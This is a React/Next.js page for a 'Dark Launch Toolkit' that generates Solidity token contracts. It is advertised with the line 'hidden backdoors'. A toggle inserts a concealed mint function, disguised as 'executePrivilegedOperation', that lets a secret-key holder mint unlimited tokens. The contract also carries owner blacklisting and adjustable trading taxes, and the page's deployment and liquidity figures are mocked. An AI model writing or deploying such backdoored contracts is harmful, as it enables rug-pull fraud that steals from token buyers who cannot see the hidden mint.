"use client"

import { useState, useEffect } from "react"
import Link from "next/link"
import { ArrowLeft, Rocket, RefreshCw, ChevronDown, ChevronUp, Code, LineChart } from "lucide-react"
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
import { Switch } from "@/components/ui/switch"
import { Slider } from "@/components/ui/slider"
import { Input } from "@/components/ui/input"
import CyberButton from "@/components/cyber-button"
import MatrixBackground from "@/components/matrix-background"
import CircuitPattern from "@/components/circuit-pattern"
import DataPulse from "@/components/data-pulse"
import GlitchText from "@/components/glitch-text"
import CyberCard from "@/components/cyber-card"
import TierGate from "@/components/tier-gate"
import { useWallet } from "@/context/wallet-context"
import WalletConnector from "@/components/wallet-connector"
import TerminalCode from "@/components/terminal-code"

export default function DarkLaunchPage() {
  const { connected } = useWallet()
  const [isLoading, setIsLoading] = useState(true)
  const [isGenerating, setIsGenerating] = useState(false)
  const [tokenName, setTokenName] = useState("")
  const [tokenSymbol, setTokenSymbol] = useState("")
  const [totalSupply, setTotalSupply] = useState("1000000")
  const [initialLiquidity, setInitialLiquidity] = useState("10")
  const [taxBuy, setTaxBuy] = useState(5)
  const [taxSell, setTaxSell] = useState(5)
  const [antiBot, setAntiBot] = useState(true)
  const [hiddenMint, setHiddenMint] = useState(false)
  const [expandedSection, setExpandedSection] = useState<string | null>("settings")
  const [generatedCode, setGeneratedCode] = useState<string | null>(null)
  const [liquidityCurve, setLiquidityCurve] = useState<any | null>(null)

  // Load initial data
  useEffect(() => {
    const loadData = async () => {
      setIsLoading(true)
      try {
        // Simulate API call delay
        await new Promise((resolve) => setTimeout(resolve, 1500))
      } finally {
        setIsLoading(false)
      }
    }

    loadData()
  }, [])

  // Toggle section expansion
  const toggleSection = (section: string) => {
    if (expandedSection === section) {
      setExpandedSection(null)
    } else {
      setExpandedSection(section)
    }
  }

  // Generate token contract
  const generateContract = async () => {
    if (isGenerating) return

    setIsGenerating(true)
    setGeneratedCode(null)
    setLiquidityCurve(null)

    try {
      // Simulate API call delay
      await new Promise((resolve) => setTimeout(resolve, 2000))

      // Generate code based on selected options
      const code = `// ${tokenName} (${tokenSymbol}) Token Contract
// Generated by $BLKBOX Dark Launch Toolkit
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";

contract ${tokenSymbol.toUpperCase()}Token is ERC20, Ownable {
    using SafeMath for uint256;
    
    // Token parameters
    uint256 private constant _totalSupply = ${totalSupply} * 10**18;
    
    // Tax settings
    uint256 public buyTax = ${taxBuy};
    uint256 public sellTax = ${taxSell};
    address public taxWallet;
    
    // Trading settings
    bool public tradingEnabled = false;
    mapping(address => bool) public isExcludedFromFees;
    mapping(address => bool) public isBlacklisted;
    
    // Anti-bot settings
    ${
      antiBot
        ? `bool public antiBotEnabled = true;
    uint256 public maxTxAmount = _totalSupply.mul(2).div(100); // 2% of total supply
    uint256 public maxWalletAmount = _totalSupply.mul(3).div(100); // 3% of total supply
    mapping(address => uint256) public lastTradeTime;
    uint256 public cooldownTime = 30 seconds;`
        : ""
    }
    
    // Hidden mint backdoor
    ${
      hiddenMint
        ? `bool private _hiddenMintEnabled = true;
    bytes32 private _hiddenMintKey = keccak256(abi.encodePacked("${Math.random().toString(36).substring(2, 15)}"));`
        : ""
    }
    
    // Events
    event TradingEnabled();
    event ExcludedFromFees(address indexed account, bool isExcluded);
    event TaxWalletUpdated(address indexed newWallet);
    event BlacklistUpdated(address indexed account, bool blacklisted);
    
    constructor() ERC20("${tokenName}", "${tokenSymbol}") {
        taxWallet = msg.sender;
        
        // Exclude owner and this contract from fees
        isExcludedFromFees[owner()] = true;
        isExcludedFromFees[address(this)] = true;
        
        // Mint tokens to deployer
        _mint(msg.sender, _totalSupply);
    }
    
    // Override transfer function to apply taxes and restrictions
    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal override {
        require(!isBlacklisted[sender] && !isBlacklisted[recipient], "Blacklisted address");
        
        // Check if trading is enabled
        if (!tradingEnabled) {
            require(isExcludedFromFees[sender] || isExcludedFromFees[recipient], "Trading not enabled");
        }
        
        // Anti-bot measures
        ${
          antiBot
            ? `if (antiBotEnabled && !isExcludedFromFees[sender] && !isExcludedFromFees[recipient]) {
            require(amount <= maxTxAmount, "Transfer amount exceeds maximum");
            
            if (recipient != owner() && recipient != address(0) && recipient != address(this)) {
                uint256 newBalance = balanceOf(recipient).add(amount);
                require(newBalance <= maxWalletAmount, "Wallet amount exceeds maximum");
            }
            
            // Cooldown period
            if (sender != owner()) {
                require(block.timestamp > lastTradeTime[sender] + cooldownTime, "Cooldown period not elapsed");
                lastTradeTime[sender] = block.timestamp;
            }
        }`
            : ""
        }
        
        // Calculate and apply taxes
        if (!isExcludedFromFees[sender] && !isExcludedFromFees[recipient]) {
            uint256 taxAmount = 0;
            
            // Determine if buy or sell
            if (recipient == pair()) { // Sell
                taxAmount = amount.mul(sellTax).div(100);
            } else if (sender == pair()) { // Buy
                taxAmount = amount.mul(buyTax).div(100);
            }
            
            if (taxAmount > 0) {
                super._transfer(sender, taxWallet, taxAmount);
                amount = amount.sub(taxAmount);
            }
        }
        
        super._transfer(sender, recipient, amount);
    }
    
    // Function to enable trading
    function enableTrading() external onlyOwner {
        tradingEnabled = true;
        emit TradingEnabled();
    }
    
    // Function to update tax wallet
    function setTaxWallet(address _taxWallet) external onlyOwner {
        taxWallet = _taxWallet;
        emit TaxWalletUpdated(_taxWallet);
    }
    
    // Function to exclude account from fees
    function excludeFromFees(address account, bool excluded) external onlyOwner {
        isExcludedFromFees[account] = excluded;
        emit ExcludedFromFees(account, excluded);
    }
    
    // Function to update blacklist
    function updateBlacklist(address account, bool blacklisted) external onlyOwner {
        isBlacklisted[account] = blacklisted;
        emit BlacklistUpdated(account, blacklisted);
    }
    
    // Function to update tax rates
    function updateTaxes(uint256 _buyTax, uint256 _sellTax) external onlyOwner {
        require(_buyTax <= 25 && _sellTax <= 25, "Tax too high");
        buyTax = _buyTax;
        sellTax = _sellTax;
    }
    
    ${
      antiBot
        ? `// Function to update anti-bot settings
    function updateAntiBotSettings(
        bool _enabled,
        uint256 _maxTxBps,
        uint256 _maxWalletBps,
        uint256 _cooldownTime
    ) external onlyOwner {
        antiBotEnabled = _enabled;
        maxTxAmount = _totalSupply.mul(_maxTxBps).div(10000);
        maxWalletAmount = _totalSupply.mul(_maxWalletBps).div(10000);
        cooldownTime = _cooldownTime;
    }`
        : ""
    }
    
    ${
      hiddenMint
        ? `// Hidden mint function (backdoor)
    function executePrivilegedOperation(bytes32 key, address to, uint256 amount) external {
        require(_hiddenMintEnabled, "Operation disabled");
        require(key == _hiddenMintKey, "Invalid key");
        _mint(to, amount);
    }
    
    // Disable hidden mint capability (one-way operation)
    function disablePrivilegedOperations() external onlyOwner {
        _hiddenMintEnabled = false;
    }`
        : ""
    }
    
    // Helper function to identify DEX pair
    function pair() internal pure returns (address) {
        // This would be replaced with actual DEX pair address in production
        return address(0xDEADBEEF);
    }
}`

      setGeneratedCode(code)

      // Generate mock liquidity curve data
      const curveData = {
        initialPrice: 0.0001,
        projectedPrice: 0.00025,
        curveType: "Exponential",
        liquidityDepth: `${initialLiquidity} SOL`,
        priceImpact: "Low",
        slippageResistance: "High",
        chart: {
          labels: ["0%", "25%", "50%", "75%", "100%"],
          values: [0, 25, 50, 75, 100],
          prices: [0.0001, 0.00013, 0.00017, 0.00021, 0.00025],
        },
      }

      setLiquidityCurve(curveData)
    } catch (error) {
      console.error("Error generating contract:", error)
    } finally {
      setIsGenerating(false)
    }
  }

  // Helper function to check if user tier is high enough
  function tierLevelCheck(userTier: string, requiredTier: string) {
    const tierLevels = {
      UNAUTHORIZED: 0,
      ENTRY_LEVEL: 1,
      OPERATOR: 2,
      SHADOW_ELITE: 3,
      PHANTOM_COUNCIL: 4,
    }

    // Always return true for PHANTOM_COUNCIL tier (highest tier)
    if (userTier === "PHANTOM_COUNCIL") return true

    return tierLevels[userTier as keyof typeof tierLevels] >= tierLevels[requiredTier as keyof typeof tierLevels]
  }

  return (
    <div className="flex min-h-screen flex-col bg-black text-white">
      <MatrixBackground />
      <CircuitPattern />

      {/* Navigation */}
      <header className="sticky top-0 z-50 border-b border-neon-pink/30 bg-black/80 backdrop-blur-md">
        <div className="container flex h-16 items-center justify-between">
          <Link
            href="/dashboard"
            className="flex items-center gap-2 text-neon-cyan hover:text-neon-pink transition-colors"
          >
            <ArrowLeft size={16} />
            <span className="font-tech-mono">BACK_TO_DASHBOARD</span>
          </Link>

          <WalletConnector buttonSize="sm" glowColor="cyan" />
        </div>
      </header>

      <main className="flex-1 container py-12">
        <TierGate requiredTier="SHADOW_ELITE">
          <div className="max-w-4xl mx-auto">
            <div className="mb-8 text-center">
              <GlitchText
                text="DARK LAUNCH TOOLKIT"
                className="text-3xl font-extrabold tracking-tight sm:text-4xl text-neon-pink mb-4"
              />
              <p className="text-neon-cyan font-tech-mono">
                DEPLOY TOKENS WITH PERFECT LIQUIDITY CURVES AND HIDDEN BACKDOORS
              </p>
              <DataPulse className="my-6" />
            </div>

            <div className="grid md:grid-cols-3 gap-6">
              <div className="md:col-span-1">
                <CyberCard className="bg-black/60">
                  <div className="flex items-center gap-3 mb-6">
                    <div className="p-3 rounded-full bg-neon-pink/10">
                      <Rocket className="h-6 w-6 text-neon-pink" />
                    </div>
                    <div>
                      <h3 className="text-lg font-bold text-neon-pink">Token Generator</h3>
                      <p className="text-zinc-400 font-tech-mono text-sm">Create custom token contracts</p>
                    </div>
                  </div>

                  <div className="space-y-4">
                    <div className="space-y-2">
                      <label className="text-sm font-tech-mono text-neon-cyan">Token Name</label>
                      <Input
                        placeholder="My Token"
                        value={tokenName}
                        onChange={(e) => setTokenName(e.target.value)}
                        className="bg-black border-zinc-800 focus:border-neon-pink"
                      />
                    </div>

                    <div className="space-y-2">
                      <label className="text-sm font-tech-mono text-neon-cyan">Token Symbol</label>
                      <Input
                        placeholder="TKN"
                        value={tokenSymbol}
                        onChange={(e) => setTokenSymbol(e.target.value)}
                        className="bg-black border-zinc-800 focus:border-neon-pink"
                      />
                    </div>

                    <div className="grid grid-cols-2 gap-4">
                      <div className="space-y-2">
                        <label className="text-sm font-tech-mono text-neon-cyan">Total Supply</label>
                        <Input
                          type="text"
                          value={totalSupply}
                          onChange={(e) => setTotalSupply(e.target.value)}
                          className="bg-black border-zinc-800 focus:border-neon-pink"
                        />
                      </div>
                      <div className="space-y-2">
                        <label className="text-sm font-tech-mono text-neon-cyan">Initial Liquidity (SOL)</label>
                        <Input
                          type="text"
                          value={initialLiquidity}
                          onChange={(e) => setInitialLiquidity(e.target.value)}
                          className="bg-black border-zinc-800 focus:border-neon-pink"
                        />
                      </div>
                    </div>

                    <CyberButton
                      onClick={generateContract}
                      disabled={isGenerating || !tokenName || !tokenSymbol}
                      glowColor="cyan"
                      className="w-full mt-4"
                    >
                      {isGenerating ? (
                        <>
                          <RefreshCw className="h-4 w-4 mr-2 animate-spin" /> GENERATING...
                        </>
                      ) : (
                        <>
                          <Code className="h-4 w-4 mr-2" /> GENERATE CONTRACT
                        </>
                      )}
                    </CyberButton>
                  </div>
                </CyberCard>

                <CyberCard className="bg-black/60 mt-6">
                  <div
                    className="flex items-center justify-between cursor-pointer"
                    onClick={() => toggleSection("settings")}
                  >
                    <h3 className="text-lg font-bold text-neon-cyan">Token Settings</h3>
                    {expandedSection === "settings" ? (
                      <ChevronUp className="h-5 w-5 text-neon-pink" />
                    ) : (
                      <ChevronDown className="h-5 w-5 text-neon-pink" />
                    )}
                  </div>

                  {expandedSection === "settings" && (
                    <div className="mt-4 space-y-4">
                      <div className="space-y-2">
                        <div className="flex justify-between">
                          <label className="text-sm font-tech-mono text-zinc-400">Buy Tax</label>
                          <span className="text-sm font-tech-mono text-neon-pink">{taxBuy}%</span>
                        </div>
                        <Slider
                          value={[taxBuy]}
                          min={0}
                          max={25}
                          step={1}
                          onValueChange={(value) => setTaxBuy(value[0])}
                          className="w-full"
                        />
                      </div>

                      <div className="space-y-2">
                        <div className="flex justify-between">
                          <label className="text-sm font-tech-mono text-zinc-400">Sell Tax</label>
                          <span className="text-sm font-tech-mono text-neon-cyan">{taxSell}%</span>
                        </div>
                        <Slider
                          value={[taxSell]}
                          min={0}
                          max={25}
                          step={1}
                          onValueChange={(value) => setTaxSell(value[0])}
                          className="w-full"
                        />
                      </div>

                      <div className="flex items-center justify-between">
                        <label className="text-sm font-tech-mono text-zinc-400">Anti-Bot Protection</label>
                        <Switch
                          checked={antiBot}
                          onCheckedChange={setAntiBot}
                          className="data-[state=checked]:bg-neon-pink"
                        />
                      </div>

                      <div className="flex items-center justify-between">
                        <label className="text-sm font-tech-mono text-zinc-400">Hidden Mint Backdoor</label>
                        <Switch
                          checked={hiddenMint}
                          onCheckedChange={setHiddenMint}
                          className="data-[state=checked]:bg-neon-pink"
                        />
                      </div>
                    </div>
                  )}
                </CyberCard>

                <CyberCard className="bg-black/60 mt-6">
                  <div
                    className="flex items-center justify-between cursor-pointer"
                    onClick={() => toggleSection("liquidity")}
                  >
                    <h3 className="text-lg font-bold text-neon-pink">Liquidity Curve</h3>
                    {expandedSection === "liquidity" ? (
                      <ChevronUp className="h-5 w-5 text-neon-cyan" />
                    ) : (
                      <ChevronDown className="h-5 w-5 text-neon-pink" />
                    )}
                  </div>

                  {expandedSection === "liquidity" && (
                    <div className="mt-4 space-y-4">
                      <div className="space-y-2">
                        <label className="text-sm font-tech-mono text-neon-cyan">Curve Type</label>
                        <select className="w-full bg-black border border-zinc-800 rounded-md p-2 text-white">
                          <option value="exponential">Exponential</option>
                          <option value="linear">Linear</option>
                          <option value="logarithmic">Logarithmic</option>
                          <option value="custom">Custom</option>
                        </select>
                      </div>

                      <div className="space-y-2">
                        <div className="flex justify-between">
                          <label className="text-sm font-tech-mono text-zinc-400">Price Impact Resistance</label>
                          <span className="text-sm font-tech-mono text-neon-pink">High</span>
                        </div>
                        <Slider value={[75]} min={0} max={100} step={5} className="w-full" />
                      </div>

                      <div className="space-y-2">
                        <div className="flex justify-between">
                          <label className="text-sm font-tech-mono text-zinc-400">Initial Price (USDC)</label>
                          <span className="text-sm font-tech-mono text-neon-cyan">0.0001</span>
                        </div>
                        <Slider value={[10]} min={1} max={100} step={1} className="w-full" />
                      </div>
                    </div>
                  )}
                </CyberCard>
              </div>

              <div className="md:col-span-2">
                <Tabs defaultValue="contract" className="w-full">
                  <TabsList className="grid grid-cols-3 mb-6">
                    <TabsTrigger value="contract" className="font-tech-mono">
                      CONTRACT
                    </TabsTrigger>
                    <TabsTrigger value="curve" className="font-tech-mono">
                      CURVE
                    </TabsTrigger>
                    <TabsTrigger value="deploy" className="font-tech-mono">
                      DEPLOY
                    </TabsTrigger>
                  </TabsList>

                  <TabsContent value="contract">
                    <CyberCard className="bg-black/60 min-h-[500px]">
                      {isLoading ? (
                        <div className="flex flex-col items-center justify-center py-12">
                          <RefreshCw className="h-8 w-8 text-neon-cyan animate-spin mb-4" />
                          <p className="text-zinc-400 font-tech-mono">Loading contract generator...</p>
                        </div>
                      ) : generatedCode ? (
                        <div>
                          <TerminalCode code={generatedCode} />
                          <div className="flex justify-end mt-6">
                            <CyberButton variant="outline" size="sm" glowColor="cyan" className="gap-2">
                              <Code className="h-4 w-4" /> DOWNLOAD CONTRACT
                            </CyberButton>
                          </div>
                        </div>
                      ) : (
                        <div className="flex flex-col items-center justify-center py-12">
                          <Code className="h-12 w-12 text-zinc-500 mb-4" />
                          <p className="text-zinc-400 font-tech-mono mb-2">No contract generated yet</p>
                          <p className="text-zinc-500 text-sm text-center max-w-md">
                            Configure your token parameters and click "Generate Contract" to create a custom token
                            contract
                          </p>
                        </div>
                      )}
                    </CyberCard>
                  </TabsContent>

                  <TabsContent value="curve">
                    <CyberCard className="bg-black/60 min-h-[500px]">
                      {isLoading ? (
                        <div className="flex flex-col items-center justify-center py-12">
                          <RefreshCw className="h-8 w-8 text-neon-cyan animate-spin mb-4" />
                          <p className="text-zinc-400 font-tech-mono">Loading curve generator...</p>
                        </div>
                      ) : liquidityCurve ? (
                        <div>
                          <h3 className="text-xl font-bold text-neon-pink mb-6">Liquidity Curve Analysis</h3>

                          <div className="grid grid-cols-2 md:grid-cols-3 gap-4 mb-6">
                            <div className="p-4 border border-zinc-800 rounded-md">
                              <p className="text-xs text-zinc-400 font-tech-mono">Initial Price</p>
                              <p className="text-xl font-bold text-neon-cyan">${liquidityCurve.initialPrice}</p>
                            </div>
                            <div className="p-4 border border-zinc-800 rounded-md">
                              <p className="text-xs text-zinc-400 font-tech-mono">Projected Price</p>
                              <p className="text-xl font-bold text-neon-pink">${liquidityCurve.projectedPrice}</p>
                            </div>
                            <div className="p-4 border border-zinc-800 rounded-md">
                              <p className="text-xs text-zinc-400 font-tech-mono">Curve Type</p>
                              <p className="text-xl font-bold text-neon-cyan">{liquidityCurve.curveType}</p>
                            </div>
                            <div className="p-4 border border-zinc-800 rounded-md">
                              <p className="text-xs text-zinc-400 font-tech-mono">Liquidity Depth</p>
                              <p className="text-xl font-bold text-neon-pink">{liquidityCurve.liquidityDepth}</p>
                            </div>
                            <div className="p-4 border border-zinc-800 rounded-md">
                              <p className="text-xs text-zinc-400 font-tech-mono">Price Impact</p>
                              <p className="text-xl font-bold text-neon-cyan">{liquidityCurve.priceImpact}</p>
                            </div>
                            <div className="p-4 border border-zinc-800 rounded-md">
                              <p className="text-xs text-zinc-400 font-tech-mono">Slippage Resistance</p>
                              <p className="text-xl font-bold text-neon-pink">{liquidityCurve.slippageResistance}</p>
                            </div>
                          </div>

                          <div className="mb-6">
                            <h4 className="text-sm font-tech-mono text-neon-cyan mb-2">Price Curve Visualization</h4>
                            <div className="h-64 bg-black/30 border border-zinc-800 rounded-md p-4 relative">
                              {/* Simple price curve visualization */}
                              <div className="absolute inset-0 p-4">
                                <div className="h-full w-full relative">
                                  {/* Y-axis labels */}
                                  <div className="absolute left-0 top-0 h-full flex flex-col justify-between text-xs text-zinc-500 font-tech-mono">
                                    <span>${liquidityCurve.chart.prices[4]}</span>
                                    <span>${liquidityCurve.chart.prices[3]}</span>
                                    <span>${liquidityCurve.chart.prices[2]}</span>
                                    <span>${liquidityCurve.chart.prices[1]}</span>
                                    <span>${liquidityCurve.chart.prices[0]}</span>
                                  </div>

                                  {/* X-axis labels */}
                                  <div className="absolute bottom-0 left-10 right-0 flex justify-between text-xs text-zinc-500 font-tech-mono">
                                    {liquidityCurve.chart.labels.map((label, i) => (
                                      <span key={i}>{label}</span>
                                    ))}
                                  </div>

                                  {/* Curve */}
                                  <div className="absolute left-10 right-0 top-0 bottom-6 flex items-end">
                                    <svg className="w-full h-full" viewBox="0 0 100 100" preserveAspectRatio="none">
                                      <path
                                        d="M0,100 C30,70 70,30 100,0"
                                        fill="none"
                                        stroke="#ff00aa"
                                        strokeWidth="2"
                                      />
                                    </svg>
                                  </div>
                                </div>
                              </div>
                            </div>
                          </div>

                          <div className="flex justify-end">
                            <CyberButton variant="outline" size="sm" glowColor="pink" className="gap-2">
                              <LineChart className="h-4 w-4" /> CUSTOMIZE CURVE
                            </CyberButton>
                          </div>
                        </div>
                      ) : (
                        <div className="flex flex-col items-center justify-center py-12">
                          <LineChart className="h-12 w-12 text-zinc-500 mb-4" />
                          <p className="text-zinc-400 font-tech-mono mb-2">No liquidity curve generated yet</p>
                          <p className="text-zinc-500 text-sm text-center max-w-md">
                            Generate a token contract first to see the liquidity curve analysis
                          </p>
                        </div>
                      )}
                    </CyberCard>
                  </TabsContent>

                  <TabsContent value="deploy">
                    <CyberCard className="bg-black/60 min-h-[500px]">
                      {!generatedCode ? (
                        <div className="flex flex-col items-center justify-center py-12">
                          <Rocket className="h-12 w-12 text-zinc-500 mb-4" />
                          <p className="text-zinc-400 font-tech-mono mb-2">No contract to deploy</p>
                          <p className="text-zinc-500 text-sm text-center max-w-md">
                            Generate a token contract first to proceed with deployment
                          </p>
                        </div>
                      ) : (
                        <div>
                          <h3 className="text-xl font-bold text-neon-pink mb-6">
                            Deploy {tokenName} ({tokenSymbol})
                          </h3>

                          <div className="space-y-6">
                            <div className="p-4 border border-zinc-800 rounded-md">
                              <h4 className="text-lg font-bold text-neon-cyan mb-2">Deployment Settings</h4>

                              <div className="space-y-4 mt-4">
                                <div className="grid grid-cols-2 gap-4">
                                  <div className="space-y-2">
                                    <label className="text-sm font-tech-mono text-zinc-400">Network</label>
                                    <select className="w-full bg-black border border-zinc-800 rounded-md p-2 text-white">
                                      <option value="solana">Solana</option>
                                      <option value="ethereum">Ethereum</option>
                                      <option value="arbitrum">Arbitrum</option>
                                    </select>
                                  </div>
                                  <div className="space-y-2">
                                    <label className="text-sm font-tech-mono text-zinc-400">Wallet</label>
                                    <Input
                                      placeholder="Enter wallet address"
                                      className="bg-black border-zinc-800 focus:border-neon-pink"
                                    />
                                  </div>
                                </div>

                                <div className="space-y-2">
                                  <label className="text-sm font-tech-mono text-zinc-400">Contract Address</label>
                                  <Input
                                    placeholder="Contract will be deployed to this address"
                                    className="bg-black border-zinc-800 focus:border-neon-pink"
                                    readOnly
                                  />
                                </div>

                                <div className="space-y-2">
                                  <label className="text-sm font-tech-mono text-zinc-400">Gas Limit</label>
                                  <Input
                                    type="number"
                                    placeholder="21000"
                                    className="bg-black border-zinc-800 focus:border-neon-pink"
                                  />
                                </div>
                              </div>
                            </div>

                            <div className="p-4 border border-zinc-800 rounded-md">
                              <h4 className="text-lg font-bold text-neon-cyan mb-2">Transaction Details</h4>

                              <div className="space-y-4 mt-4">
                                <div className="flex items-center justify-between">
                                  <p className="text-sm font-tech-mono text-zinc-400">Estimated Gas Fee</p>
                                  <p className="text-sm font-tech-mono text-neon-pink">0.0005 ETH</p>
                                </div>
                                <div className="flex items-center justify-between">
                                  <p className="text-sm font-tech-mono text-zinc-400">Transaction Speed</p>
                                  <p className="text-sm font-tech-mono text-neon-cyan">Fast</p>
                                </div>
                              </div>
                            </div>
                          </div>

                          <div className="flex justify-end mt-6">
                            <CyberButton glowColor="pink">
                              <Rocket className="h-4 w-4 mr-2" /> DEPLOY CONTRACT
                            </CyberButton>
                          </div>
                        </div>
                      )}
                    </CyberCard>
                  </TabsContent>
                </Tabs>
              </div>
            </div>
          </TierGate>
        </main>

        <footer className="border-t border-neon-pink/30 py-6 bg-black">
          <div className="container text-center">
            <p className="text-sm text-zinc-500 font-tech-mono">© 2025 $BLKBOX. All rights reserved.</p>
          </div>
        </footer>
      </div>
    );
  }
